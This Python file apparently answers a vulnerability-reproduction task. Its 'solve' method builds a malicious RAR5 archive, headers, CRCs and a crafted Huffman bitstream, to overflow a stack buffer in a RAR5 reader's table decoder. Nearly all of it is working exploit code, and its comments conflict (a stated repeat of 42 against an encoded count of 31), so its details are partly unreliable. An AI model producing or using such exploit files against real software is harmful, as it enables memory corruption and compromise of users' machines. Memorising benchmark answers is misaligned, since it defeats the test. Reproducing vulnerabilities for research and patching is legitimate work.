import zlib
import struct

class Solution:
    """
    Generates a PoC for a stack buffer overflow in a RAR5 reader's
    Huffman table parsing logic.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates a malicious RAR5 archive.

        The vulnerability is a stack buffer overflow when uncompressing Huffman
        tables. The tables are compressed with an RLE-like scheme. By crafting
        a stream with a repeat command (symbol 18) near the end of the
        table buffer, we can cause the decoder to write past the buffer's bounds.

        The PoC constructs a minimal RAR5 file with a single compressed file.
        The compressed data for this file contains a specially crafted Huffman
        table description that triggers the overflow.

        Args:
            src_path: Path to the vulnerable source code (unused).

        Returns:
            A bytes object representing the malicious RAR5 file.
        """
        
        def vint(n: int) -> bytes:
            """Encodes an integer into the RAR5 variable-length integer format."""
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                b = n & 0x7f
                n >>= 7
                if n > 0:
                    b |= 0x80
                res.append(b)
            return bytes(res)

        def crc32(data: bytes) -> bytes:
            """Calculates CRC32 and returns it as little-endian bytes."""
            return struct.pack('<I', zlib.crc32(data) & 0xffffffff)

        # 1. RAR5 Signature
        poc = bytearray(b'\x52\x61\x72\x21\x1a\x07\x01\x00')

        # 2. Main Archive Header (type=2)
        # We set the SOLID flag as the vulnerability might be in a code path
        # for solid archives.
        main_hdr_flags = 2  # Solid archive
        main_hdr_data = vint(2) + vint(main_hdr_flags)
        main_hdr_size_vint = vint(len(main_hdr_data))
        main_hdr_for_crc = main_hdr_size_vint + main_hdr_data
        poc.extend(crc32(main_hdr_for_crc) + main_hdr_for_crc)

        # 3. File Header (type=3)
        # The compressed data size is constant for this PoC.
        # 1 (filters) + 10 (BC table) + 52 (main table stream)
        data_size = 63
        
        # Calculate header and block sizes. A simple calculation is sufficient
        # as sizes are small and vints will be single-byte.
        # Fields: type, hdr_flags, block_size, file_flags, unpack_size, attrib,
        #         crc, comp_info, os, name
        header_size_val = 1 + 1 + 1 + 1 + 1 + 1 + 4 + 1 + 1 + (1 + 1)
        block_size_val = header_size_val + data_size
        
        v_header_size = vint(header_size_val)
        v_block_size = vint(block_size_val)
        
        file_hdr_fields = b"".join([
            vint(3),           # Type=3
            vint(1),           # Header Flags (data present)
            v_block_size,      # Block Size
            vint(0x20),        # File Flags (solid file)
            vint(0),           # Unpacked Size
            vint(0x20),        # Attributes
            b'\x00\x00\x00\x00', # File CRC32 (placeholder)
            vint(0x28),        # Compression Info (method 5, 64k dict)
            vint(2),           # Host OS (Windows)
            vint(1) + b'a'     # File Name ('a')
        ])
        
        file_hdr_for_crc = v_header_size + file_hdr_fields
        poc.extend(crc32(file_hdr_for_crc) + file_hdr_for_crc)
        
        # 4. Compressed Data Block (The Payload)
        data = bytearray()
        
        # No filters
        data.append(0)
        
        # BC table bit lengths (Huffman table for other Huffman tables)
        # We define a simple table:
        # - Symbol 0 gets code length 1 (Huffman code '0')
        # - Symbol 18 gets code length 1 (Huffman code '1')
        # Symbol 18 is a command to repeat zeros.
        data.extend(b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01')
        
        # Main Huffman table stream, decoded using the BC table.
        # The target buffer size is 404.
        # We write 403 zeros using BC symbol 0 (code '0').
        # Then we issue command 18 (code '1') to repeat zeros 42 times.
        # This writes from index 403 to 444, overflowing the buffer.
        # Bitstream: 403 '0's + '1' + 5 '1's (for repeat count) = 409 bits.
        
        # 403 bits = 50 bytes and 3 bits.
        stream = bytearray(b'\x00' * 50)
        
        # Next byte (LSB first bit order):
        # bit 0-2: three '0's (end of 403 zero run)
        # bit 3:   '1' (code for symbol 18)
        # bit 4-7: four '1's (first 4 bits of repeat count 31)
        # byte = 11111000b = 0xF8
        stream.append(0xF8)
        
        # Last byte:
        # bit 0: '1' (last bit of repeat count 31)
        # byte = 00000001b = 0x01
        stream.append(0x01)
        data.extend(stream)

        poc.extend(data)

        # 5. End of Archive Header (type=5)
        end_hdr_data = vint(5) + vint(0)  # Type=5, Flags=0
        end_hdr_size_vint = vint(len(end_hdr_data))
        end_hdr_for_crc = end_hdr_size_vint + end_hdr_data
        poc.extend(crc32(end_hdr_for_crc) + end_hdr_for_crc)
        
        return bytes(poc)
